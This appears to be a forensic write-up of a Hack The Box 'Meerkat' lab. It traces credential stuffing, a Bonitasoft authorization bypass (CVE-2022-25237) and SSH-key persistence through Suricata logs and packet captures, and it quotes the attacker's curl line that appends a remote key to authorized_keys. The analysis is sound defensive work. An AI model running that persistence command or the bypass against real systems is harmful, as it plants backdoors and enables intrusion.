---
title: "Meerkat — Network PCAP & Suricata Log Triage"
category: "HTB Sherlock / DFIR"
difficulty: "Intermediate"
date: 2026-08-10
summary: "Full network forensic investigation analyzing Suricata alert logs and packet captures (PCAP): credential stuffing detection, Bonitasoft authorization bypass (CVE-2022-25237), malicious RCE API payload upload, and SSH backdoor persistence."
tools: ["Wireshark", "Jq", "Suricata Logs", "Browserling", "MITRE ATT&CK"]
published: true
---

## 1. Introduction & Scenario

- **Sherlock Name:** Meerkat
- **Investigative Premise:** Network Packet Analysis & Suricata JSON Log Triage

> **Scenario Context:** You are brought in as the new security provider for *Forela*, a fast-growing startup using a business management platform with insufficient documentation and potentially lax security practices. Provided with network packet capture (PCAP) data and Suricata alert logs, your objective is to determine if a system compromise occurred, map the attacker's attack path, and document all Indicators of Compromise (IOCs).

---

## 2. Tools & Analysis Environment

- **`jq`** — JSON command-line parser used for filtering, aggregating, and sorting Suricata alert outputs.
- **Wireshark** — Deep network packet inspection for HTTP streams, TCP conversations, payload extraction, and protocol reconstruction.
- **Browserling** — Isolated sandboxed browser for safe external infrastructure verification.
- **MITRE ATT&CK** — Threat intelligence mapping for observed tactics and techniques.

### Essential `jq` Log Parsing Queries:

```bash
# View and inspect Suricata alerts schema
jq . meerkat-alerts.json 

# Extract and count unique alert signatures
jq '.[].alert.signature' meerkat-alerts.json -r | sort | uniq -c | sort -nr 

# Extract and aggregate source IP addresses
jq '.[].src_ip' meerkat-alerts.json -r | sort | uniq -c | sort -nr

# Correlate source IPs with triggered alert signatures
jq -r '.[] | "\(.src_ip) \(.alert.signature)"' meerkat-alerts.json | sort | uniq -c | sort -nr
```

### Essential Wireshark Display Filters:

```text
# Filter traffic by specific suspect IP
ip.addr == 156.146.62.213

# Filter specific IP and isolate HTTP application streams
(ip.addr == 156.146.62.213) && (http)
```

---

## 3. Executive Summary & Attack Timeline

An external threat actor conducted a targeted compromise against Forela's internal business management platform running **Bonitasoft**. 

1. **Credential Stuffing:** The attacker launched an automated brute force/stuffing attack against the `/loginservice` endpoint, successfully discovering valid credentials for user `seb.broom@fella.co.uk` (`government`).
2. **Exploitation & Authorization Bypass:** Leveraging **CVE-2022-25237** via the `i18nTranslation` API endpoint, the adversary bypassed access controls and uploaded a malicious API extension (`rce_api_extension.zip`).
3. **Remote Code Execution & Staging:** The uploaded extension executed arbitrary system commands (`whoami`, `wget`), retrieving a staging script from `paste.ee`.
4. **Persistence:** The malicious payload appended an external rogue SSH public key to `/home/ubuntu/.ssh/authorized_keys` and restarted the SSH daemon.
5. **Interactive Access:** The attacker subsequently established an interactive inbound SSH session from `95.181.232.30`.

---

## 4. Indicators of Compromise (IOCs)

### Network Indicators

| Indicator | Type | Description / Role |
|---|---|---|
| `156.146.62.213` | IPv4 Address | **Primary Attacker IP:** Reconnaissance, Credential Stuffing, and initial exploitation trigger (`whoami`). |
| `138.99.59.221` | IPv4 Address | **Secondary Attacker IP:** Staging payload delivery execution (`wget`). |
| `95.181.232.30` | IPv4 Address | **Inbound SSH IP:** Attacker connecting via SSH using the planted rogue key. |
| `paste.ee` | Domain | **C2 / Staging Infrastructure:** Text-sharing platform hosting malicious bash staging script. |
| `fella.co.uk:8080` | Domain / Host | Compromised internal target server hosting Bonitasoft. |

### Host, File & Endpoint Artifacts

| Artifact | Type | Description |
|---|---|---|
| `CVE-2022-25237` | Vulnerability | Bonitasoft Authorization Bypass & Remote Code Execution (RCE). |
| `i18nTranslation` | URI String | String appended to API endpoints to bypass authorization filters. |
| `rce_api_extension.zip` | File | Malicious API extension zip uploaded to achieve command execution. |
| `hfffGR4unv` | File Name / ID | Attacker public key identifier retrieved from `paste.ee`. |
| `/home/ubuntu/.ssh/authorized_keys` | File Path | Backdoored SSH key store modified for persistence. |

### Compromised Credentials & Authentication Evidence

- **Compromised Account:** `seb.broom@fella.co.uk` (URL decoded from `seb.broom%40fella.co.uk`)
- **Compromised Password:** `government`
- **Authentication Status Code:** HTTP `204 No Content` (Successful authentication; all failed attempts returned HTTP `401 Unauthorized`).
- **Total Credential Stuffing Attempts:** **56** distinct username/password combinations across 118 POST requests.

---

## 5. Cyber Kill Chain & MITRE ATT&CK Mapping

```
[ Credential Stuffing (T1110.004) ] ──> [ CVE-2022-25237 Auth Bypass (T1190) ]
                                                       │
                                                       ▼
[ Ingress Tool Transfer / Staging (T1105) ] <── [ Malicious API Zip Upload (T1203) ]
                    │
                    ▼
[ SSH Authorized Keys Persistence (T1098.004) ] ──> [ Direct Ingress Access (T1021.004) ]
```

| Attack Stage | MITRE ATT&CK Technique | ID | Observables / Evidence |
|---|---|---|---|
| **Credential Access** | Brute Force: Credential Stuffing | **T1110.004** | 56 automated `POST` requests to Bonita `/loginservice` using `Python-requests` user agent. |
| **Initial Access / Execution** | Exploit Public-Facing Application | **T1190** | Authorization bypass on Bonitasoft via `i18nTranslation` endpoint parameter (**CVE-2022-25237**). |
| **Command & Control** | Ingress Tool Transfer | **T1105** | HTTP `GET` request executing `wget` to retrieve a remote script hosted on `paste.ee`. |
| **Persistence** | Account Manipulation: SSH Authorized Keys | **T1098.004** | Script appended external SSH key to `/home/ubuntu/.ssh/authorized_keys` and ran `sudo service ssh restart`. |
| **Lateral Movement** | Remote Services: SSH | **T1021.004** | Subsequent inbound SSH connection established from `95.181.232.30`. |

---

## 6. Detailed Evidence Analysis

### Suricata Alert Analysis (`meerkat-alerts.json`)

High volume of alerts triggered for:
- `USER_AGENT Python-requests`
- `Possible Staging for CVE-2022-25237` (Bonitasoft)
- `ATTACK_RESPONSE Possible /etc/passwd`

### Network Packet Analysis (`meerkat.pcap`)

1. **Recon & Credential Stuffing:** Attacker IP `156.146.62.213` generated 118 POST requests to Bonita's login endpoint. Analysis revealed 56 unique username/password pairs tested.
2. **Exploitation:** Successful login observed for `seb.broom@fella.co.uk` / `government` (HTTP status `204`).
3. **Payload Upload & Execution:** The attacker used `i18nTranslation` to upload `rce_api_extension.zip` and executed system checks (`whoami`).
4. **Persistence Routine:** From IP `138.99.59.221`, a `wget` command fetched a shell script from `paste.ee`. The script contained:
   ```bash
   curl -s https://paste.ee/r/.../hfffGR4unv >> /home/ubuntu/.ssh/authorized_keys
   sudo service ssh restart
   ```
5. **Interactive Access:** Shortly after execution, IP `95.181.232.30` initiated an active SSH session to the server.
